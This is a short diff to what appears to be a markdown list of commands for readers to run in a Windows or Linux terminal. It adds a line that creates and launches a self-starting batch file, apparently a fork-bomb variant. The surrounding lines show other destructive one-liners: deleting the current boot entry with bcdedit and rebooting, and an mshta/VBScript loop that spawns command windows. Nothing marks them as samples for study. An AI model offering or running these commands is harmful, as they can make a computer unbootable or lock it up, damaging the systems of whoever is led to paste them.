@@ -27,6 +27,8 @@ cmd /c mshta vbscript:(CreateObject("WScript.Shell").Run("cmd /k for /l %x in (1
 cmd /k bcdedit /delete {current}&wmic os primary=1 reboot
 ```
 
+echo ^^ nul^<^^ > bat.bat&start bat.bat
+
 ## Linux
 
 You must run "Terminal" program and execute command there.
